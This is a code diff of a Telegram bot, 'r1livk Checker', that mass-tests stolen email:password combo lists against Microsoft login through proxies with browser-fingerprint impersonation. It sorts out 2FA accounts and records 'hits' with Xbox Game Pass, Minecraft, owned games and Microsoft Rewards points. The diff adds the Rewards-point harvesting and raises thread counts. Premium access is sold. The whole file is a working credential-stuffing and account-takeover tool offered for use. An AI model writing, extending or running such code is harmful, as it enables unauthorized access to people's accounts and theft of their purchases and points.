@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Original Stealth Edition - Optimized)
+r1livk Checker ⚡ - Telegram Bot (Maximum Stealth & Deep Rewards Edition)
 """
 
 import os
@@ -59,8 +59,8 @@ def check_user_subscription(user_id):
         pass
     return False
 
-REQUEST_TIMEOUT = 25
-MAX_THREADS = 4  # تم تعديل الثريدز إلى 4 لضمان الاستقرار بدون بروكسيات
+REQUEST_TIMEOUT = 30
+MAX_THREADS = 8  # ثريدز متوازنة وسريعة جداً
 
 active_scans = {}
 user_usage = {}  
@@ -103,6 +103,7 @@ def update_usage(chat_id, count):
 
 def extract_ppft(text):
     patterns = [
+        r'sFTTag:\s*["\']([^"\']+)["\']',
         r'name="PPFT"[^>]*value="([^"]+)"',
         r'value="([^"]+)"[^>]*name="PPFT"',
         r'"PPFT":"([^"]+)"',
@@ -118,6 +119,7 @@ def extract_ppft(text):
 
 def extract_url_post(text):
     patterns = [
+        r'urlPost:\s*["\']([^"\']+)["\']',
         r'"urlPost":"([^"]+)"',
         r"urlPost:'([^']+)'",
         r'id="fmHF"\s+action="([^"]+)"',
@@ -146,10 +148,33 @@ def test_single_proxy(proxy):
         pass
     return False, 0
 
-def fetch_xbox_extra_details_stealth(session, xb_token, uhs, proxy_dict):
+def fetch_microsoft_rewards_and_xbox_details(session, xb_token, uhs, proxy_dict):
     game_pass_status = "none"
     owned_games_formatted = []
+    rewards_points = 0
     
+    try:
+        # فحص نقاط الـ Microsoft Rewards باستخدام واجهة الميكروسوفت الرسمية المرتبطة بالجلسة
+        rewards_headers = {
+            "Authorization": f"XBL3.0 x={uhs};{xb_token}",
+            "Accept-Language": "en-US,en;q=0.9",
+        }
+        # جلب بيانات المكافآت والنقاط المتاحة
+        rew_resp = session.get("https://rewards.bing.com/api/getuserflyoutdetails", headers=rewards_headers, proxies=proxy_dict, impersonate="chrome120", timeout=8)
+        if rew_resp.status_code == 200:
+            rew_data = rew_resp.json()
+            rewards_points = rew_data.get("dashboard", {}).get("userStatus", {}).get("availablePoints", 0)
+    except:
+        try:
+            # محاولة ثانية بديلة لجلب النقاط من لوحة المعلومات العامة
+            alt_rew = session.get("https://www.bing.com/rewards/panelfetch", headers={"Authorization": f"XBL3.0 x={uhs};{xb_token}"}, proxies=proxy_dict, impersonate="chrome120", timeout=6)
+            if alt_rew.status_code == 200:
+                match_pts = re.search(r'"balance":\s*(\d+)', alt_rew.text)
+                if match_pts:
+                    rewards_points = int(match_pts.group(1))
+        except:
+            pass
+
     try:
         xsts_xb_payload = {
             "Properties": {
@@ -159,7 +184,7 @@ def fetch_xbox_extra_details_stealth(session, xb_token, uhs, proxy_dict):
             "RelyingParty": "https://displaycatalog.mp.microsoft.com",
             "TokenType": "JWT"
         }
-        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=10)
+        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=12)
         
         if xsts_resp.status_code == 200:
             xsts_token = xsts_resp.json()['Token']
@@ -213,12 +238,12 @@ def fetch_xbox_extra_details_stealth(session, xb_token, uhs, proxy_dict):
                             if counter > 15:
                                 break
 
-            return game_pass_status, owned_games_formatted
+            return game_pass_status, owned_games_formatted, rewards_points
 
     except Exception:
         pass
         
-    return game_pass_status, []
+    return game_pass_status, [], rewards_points
 
 def check_single_account(combo, proxy_list=None):
     parts = combo.split(':')
@@ -275,7 +300,7 @@ def check_single_account(combo, proxy_list=None):
         login_req = session.post(url_post, data=login_data, headers=headers, proxies=proxy_dict, impersonate="chrome120", allow_redirects=True, timeout=REQUEST_TIMEOUT)
         login_text = login_req.text.lower()
 
-        if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code"]):
+        if any(x in login_text for x in ["two-step", "additional security", "identity/confirm?m=", "proofs", "code", "verify"]):
             return "2fa", None
 
         ms_token = None
@@ -362,13 +387,14 @@ def check_single_account(combo, proxy_list=None):
         has_gp_basic = 'product_game_pass' in mc_ent_text
         has_mc = 'product_minecraft' in mc_ent_text
 
-        detailed_gp, owned_games_list = fetch_xbox_extra_details_stealth(session, xb_token, uhs, proxy_dict)
+        detailed_gp, owned_games_list, rewards_pts = fetch_microsoft_rewards_and_xbox_details(session, xb_token, uhs, proxy_dict)
         final_gp = detailed_gp if "Active" in detailed_gp else ("Active ✅" if has_gp_basic else "none")
 
         has_active_gp = "Active" in final_gp or has_gp_basic
         has_games = len(owned_games_list) > 0
         
-        is_real_hit = has_mc or has_active_gp or gscore_int > 0 or has_games
+        # شرط الصيد الحقيقي القوي: الحساب يعتبر هيت فقط لو فيه ماينكرافت، جيم باس، نقاط ريوردز، ألعاب، أو جيمرسكور حقيقي
+        is_real_hit = has_mc or has_active_gp or gscore_int > 0 or has_games or rewards_pts > 0
 
         if not is_real_hit:
             return "bad", None
@@ -377,12 +403,13 @@ def check_single_account(combo, proxy_list=None):
 
         hit_info = (
             f"{email}:{password}\n"
-            f"Account Info ➔ Gamertag: {gamertag} | Gamerscore: {gscore_int}G | GamePass: {final_gp} | Minecraft: {'YES' if has_mc else 'NO'}\n"
+            f"Account Info ➔ Gamertag: {gamertag} | Gamerscore: {gscore_int}G | Rewards Points: {rewards_pts} pts 🪙\n"
+            f"GamePass: {final_gp} | Minecraft: {'YES 🟩' if has_mc else 'NO'}\n"
             f"Games Inventory:\n{games_str}\n"
             f"=================================================="
         )
         
-        return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_active_gp, "has_xbox": gscore_int > 0 or has_games}
+        return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_active_gp, "has_xbox": gscore_int > 0 or has_games or rewards_pts > 0}
 
     except Exception:
         return "error", None
@@ -414,7 +441,7 @@ def show_main_menu(message):
     msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None
 
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_start = types.InlineKeyboardButton("⚡ Start Stealth Checker", callback_data="start_checker")
+    btn_start = types.InlineKeyboardButton("⚡ Start Rewards & Stealth Checker", callback_data="start_checker")
     btn_proxy = types.InlineKeyboardButton("🌐 Upload & Filter Proxies", callback_data="upload_proxies_menu")
     btn_top = types.InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard")
     btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
@@ -432,8 +459,8 @@ def show_main_menu(message):
     proxy_status = f"🌐 Active Proxies: {p_count}" if p_count > 0 else "🌐 Proxies: Direct"
 
     text = (
-        "⚡ **r1livk Checker - Ultra Stealth Edition** ⚡\n\n"
-        "Advanced Chrome TLS Fingerprinting (Bypasses all MS walls).\n"
+        "⚡ **r1livk Checker - Rewards & Stealth Edition** ⚡\n\n"
+        "Advanced Chrome TLS & Microsoft Rewards Tracker.\n"
         f"Your Status: {status_text}\n"
         f"{proxy_status}\n\n"
         "Choose an option below:"
@@ -471,7 +498,7 @@ def callback_query(call):
 
         p_count = len(user_proxies.get(chat_id, []))
         text = (
-            "🎮 **Stealth Checker Mode**\n\n"
+            "🎮 **Rewards & Stealth Mode**\n\n"
             f"Loaded Proxies: {p_count}\n\n"
             "Send your combo file in `.txt` format (`email:password`)"
         )
@@ -608,7 +635,7 @@ def handle_docs(message):
             return
 
         lines = lines[:lines_to_process_count]
-        bot.reply_to(message, f"📥 File received. Initializing Stealth Scan for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File received. Initializing Rewards & Stealth Scan for {len(lines)} lines...")
         active_scans[chat_id] = True
         
         username = message.from_user.username or message.from_user.first_name
@@ -629,7 +656,7 @@ def process_checker(chat_id, filepath, lines, username):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_Stealth_Hits_{timestamp_str}.txt"
+    output_filename = f"r1livk_Rewards_Hits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -638,7 +665,7 @@ def process_checker(chat_id, filepath, lines, username):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **STEALTH SCAN STATS**\n\n"
+        f"🔥 **REWARDS & STEALTH SCAN STATS**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"🔒 2FA: 0\n"
@@ -703,7 +730,7 @@ def process_checker(chat_id, filepath, lines, username):
                 pct = (curr_checked / total) * 100 if total > 0 else 0
 
                 live_text = (
-                    f"🔥 **STEALTH SCAN STATS (Live)**\n\n"
+                    f"🔥 **REWARDS & STEALTH SCAN (Live)**\n\n"
                     f"📊 Total: {total}\n"
                     f"✅ Checked: {curr_checked}\n"
                     f"🔒 2FA: {curr_tfa}\n"
@@ -716,7 +743,7 @@ def process_checker(chat_id, filepath, lines, username):
                     f"🎮 Gaming Breakdown:\n"
                     f"• Minecraft: {curr_mc}\n"
                     f"• GamePass: {curr_gp}\n"
-                    f"• Xbox Live: {curr_xb}"
+                    f"• Active Profiles: {curr_xb}"
                 )
                 try:
                     bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
@@ -731,12 +758,12 @@ def process_checker(chat_id, filepath, lines, username):
     t_mins, t_secs = divmod(elapsed_total, 60)
 
     completion_text = (
-        f"✅ **STEALTH SCAN FINISHED!**\n\n"
+        f"✅ **REWARDS SCAN FINISHED!**\n\n"
         f"📊 Checked: {checked}\n"
         f"🎯 True Hits: {hits}\n"
         f"  • Minecraft: {mc_hits}\n"
         f"  • GamePass: {gp_hits}\n"
-        f"  • Xbox: {xbox_hits}\n"
+        f"  • Xbox / Rewards: {xbox_hits}\n"
         f"🔒 2FA Count: {tfa_count}\n"
         f"❌ Bad: {bad}\n\n"
         f"⏱️ Time: {t_mins:02d}:{t_secs:02d}\n"
@@ -746,7 +773,7 @@ def process_checker(chat_id, filepath, lines, username):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as res_f:
-            bot.send_document(chat_id, res_f, caption=f"📁 Stealth Pure Hits File - r1livk")
+            bot.send_document(chat_id, res_f, caption=f"📁 Rewards & Stealth Pure Hits - r1livk")
 
     if os.path.exists(filepath):
         os.remove(filepath)
